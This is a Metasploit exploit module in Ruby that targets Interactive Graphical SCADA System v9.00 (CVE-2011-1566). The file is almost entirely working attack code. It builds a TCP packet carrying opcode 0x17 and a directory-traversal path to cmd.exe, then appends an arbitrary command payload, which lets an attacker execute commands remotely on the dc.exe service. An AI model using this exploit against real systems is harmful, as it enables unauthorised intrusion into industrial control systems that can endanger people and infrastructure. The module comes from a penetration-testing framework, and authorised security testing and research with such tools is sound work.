##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Interactive Graphical SCADA System Remote Command Injection',
      'Description'    => %q{
          This module abuses a directory traversal flaw in Interactive
        Graphical SCADA System v9.00. In conjunction with the traversal
        flaw, if opcode 0x17 is sent to the dc.exe process, an attacker
        may be able to execute arbitrary system commands.
      },
      'Author'         =>
        [
          'Luigi Auriemma',
          'MC'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2011-1566'],
          [ 'OSVDB', '72349'],
          [ 'URL', 'http://aluigi.org/adv/igss_8-adv.txt' ],
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'       => 153,
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'Windows', {} ]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false,
      'DisclosureDate' => 'Mar 21 2011'))

    register_options(
      [
        Opt::RPORT(12397)
      ], self.class)
  end

  def exploit

    print_status("Sending exploit packet...")

    connect

    packet =  [0x00000100].pack('V') + [0x00000000].pack('V')
    packet << [0x00000100].pack('V') + [0x00000017].pack('V')
    packet << [0x00000000].pack('V') + [0x00000000].pack('V')
    packet << [0x00000000].pack('V') + [0x00000000].pack('V')
    packet << [0x00000000].pack('V') + [0x00000000].pack('V')
    packet << [0x00000000].pack('V')
    packet << "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
    packet << "windows\\system32\\cmd.exe\" /c #{payload.encoded}"
    packet << "\x00" * (143) #

    sock.put(packet)
    sock.get_once(-1,0.5)
    disconnect

  end

end
